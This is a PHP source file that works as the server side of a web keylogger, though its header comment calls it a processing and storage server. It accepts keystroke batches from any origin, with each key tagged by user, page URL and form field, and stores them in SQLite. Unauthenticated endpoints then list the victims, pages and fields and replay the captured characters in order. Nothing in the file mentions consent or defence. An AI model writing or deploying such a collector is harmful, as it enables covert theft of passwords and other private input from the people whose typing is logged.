<?php
// api.php - Processing and SQLite database storage server

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$dbFile = __DIR__ . '/storage.db';

try {
    $pdo = new PDO('sqlite:' . $dbFile);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

    // Create keystrokes table if it does not exist
    $pdo->exec("CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT NOT NULL,
        page_url TEXT NOT NULL,
        field_id TEXT NOT NULL,
        field_name TEXT DEFAULT '',
        key_char TEXT NOT NULL,
        key_code TEXT DEFAULT '',
        sequence_order INTEGER DEFAULT 0,
        timestamp REAL DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    // Indexes for faster queries
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_user_id ON keystrokes (user_id)");
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_user_page ON keystrokes (user_id, page_url)");
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_user_page_field ON keystrokes (user_id, page_url, field_id)");

} catch (PDOException $e) {
    echo json_encode(['status' => 'error', 'message' => 'Database connection failed: ' . $e->getMessage()]);
    exit;
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && empty($action)) {
    // Check JSON body for action
    $rawInput = file_get_contents('php://input');
    $jsonData = json_decode($rawInput, true);
    if ($jsonData && isset($jsonData['action'])) {
        $action = $jsonData['action'];
    }
}

switch ($action) {
    case 'save_keys':
        saveKeys($pdo);
        break;

    case 'get_users':
        getUsers($pdo);
        break;

    case 'get_pages':
        getPages($pdo);
        break;

    case 'get_fields':
        getFields($pdo);
        break;

    case 'get_keys':
        getKeys($pdo);
        break;

    default:
        echo json_encode(['status' => 'error', 'message' => 'Invalid action']);
        break;
}

function saveKeys(PDO $pdo) {
    $rawInput = file_get_contents('php://input');
    $data = json_decode($rawInput, true);

    if (!$data || !isset($data['keys']) || !is_array($data['keys'])) {
        // Fallback to $_POST
        if (isset($_POST['keys'])) {
            $keys = is_string($_POST['keys']) ? json_decode($_POST['keys'], true) : $_POST['keys'];
            $userId = $_POST['user_id'] ?? 'anonymous';
            $pageUrl = $_POST['page_url'] ?? '';
        } else {
            echo json_encode(['status' => 'error', 'message' => 'No key data provided']);
            return;
        }
    } else {
        $keys = $data['keys'];
        $userId = $data['user_id'] ?? 'anonymous';
        $pageUrl = $data['page_url'] ?? '';
    }

    if (empty($keys)) {
        echo json_encode(['status' => 'success', 'count' => 0]);
        return;
    }

    try {
        $pdo->beginTransaction();

        $stmt = $pdo->prepare("INSERT INTO keystrokes
            (user_id, page_url, field_id, field_name, key_char, key_code, sequence_order, timestamp)
            VALUES (:user_id, :page_url, :field_id, :field_name, :key_char, :key_code, :sequence_order, :timestamp)");

        $inserted = 0;
        foreach ($keys as $k) {
            $uId = $k['user_id'] ?? $userId;
            $pUrl = $k['page_url'] ?? $pageUrl;
            $fId = $k['field_id'] ?? 'unknown_field';
            $fName = $k['field_name'] ?? '';
            $kChar = $k['key_char'] ?? ($k['key'] ?? '');
            $kCode = $k['key_code'] ?? ($k['code'] ?? '');
            $seqOrder = isset($k['sequence_order']) ? (int)$k['sequence_order'] : 0;
            $ts = isset($k['timestamp']) ? (float)$k['timestamp'] : microtime(true) * 1000;

            $stmt->execute([
                ':user_id' => $uId,
                ':page_url' => $pUrl,
                ':field_id' => $fId,
                ':field_name' => $fName,
                ':key_char' => $kChar,
                ':key_code' => $kCode,
                ':sequence_order' => $seqOrder,
                ':timestamp' => $ts
            ]);
            $inserted++;
        }

        $pdo->commit();
        echo json_encode(['status' => 'success', 'inserted' => $inserted]);
    } catch (PDOException $e) {
        if ($pdo->inTransaction()) {
            $pdo->rollBack();
        }
        echo json_encode(['status' => 'error', 'message' => 'Failed to save keystrokes: ' . $e->getMessage()]);
    }
}

function getUsers(PDO $pdo) {
    try {
        $stmt = $pdo->query("SELECT DISTINCT user_id FROM keystrokes ORDER BY user_id ASC");
        $users = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo json_encode(['status' => 'success', 'users' => $users]);
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
}

function getPages(PDO $pdo) {
    $userId = $_GET['user_id'] ?? '';
    if (empty($userId)) {
        echo json_encode(['status' => 'error', 'message' => 'Missing user_id parameter']);
        return;
    }

    try {
        $stmt = $pdo->prepare("SELECT DISTINCT page_url FROM keystrokes WHERE user_id = :user_id ORDER BY page_url ASC");
        $stmt->execute([':user_id' => $userId]);
        $pages = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo json_encode(['status' => 'success', 'pages' => $pages]);
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
}

function getFields(PDO $pdo) {
    $userId = $_GET['user_id'] ?? '';
    $pageUrl = $_GET['page_url'] ?? '';

    if (empty($userId) || empty($pageUrl)) {
        echo json_encode(['status' => 'error', 'message' => 'Missing user_id or page_url parameter']);
        return;
    }

    try {
        $stmt = $pdo->prepare("SELECT field_id, field_name, COUNT(*) as key_count FROM keystrokes WHERE user_id = :user_id AND page_url = :page_url GROUP BY field_id, field_name ORDER BY MIN(id) ASC");
        $stmt->execute([':user_id' => $userId, ':page_url' => $pageUrl]);
        $fields = $stmt->fetchAll();
        echo json_encode(['status' => 'success', 'fields' => $fields]);
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
}

function getKeys(PDO $pdo) {
    $userId = $_GET['user_id'] ?? '';
    $pageUrl = $_GET['page_url'] ?? '';
    $fieldId = $_GET['field_id'] ?? ''; // optional or 'all'

    if (empty($userId) || empty($pageUrl)) {
        echo json_encode(['status' => 'error', 'message' => 'Missing user_id or page_url parameter']);
        return;
    }

    try {
        if (!empty($fieldId) && $fieldId !== 'all') {
            $stmt = $pdo->prepare("SELECT * FROM keystrokes WHERE user_id = :user_id AND page_url = :page_url AND field_id = :field_id ORDER BY sequence_order ASC, id ASC");
            $stmt->execute([
                ':user_id' => $userId,
                ':page_url' => $pageUrl,
                ':field_id' => $fieldId
            ]);
        } else {
            $stmt = $pdo->prepare("SELECT * FROM keystrokes WHERE user_id = :user_id AND page_url = :page_url ORDER BY sequence_order ASC, id ASC");
            $stmt->execute([
                ':user_id' => $userId,
                ':page_url' => $pageUrl
            ]);
        }
        $keys = $stmt->fetchAll();
        echo json_encode(['status' => 'success', 'keys' => $keys]);
    } catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
}
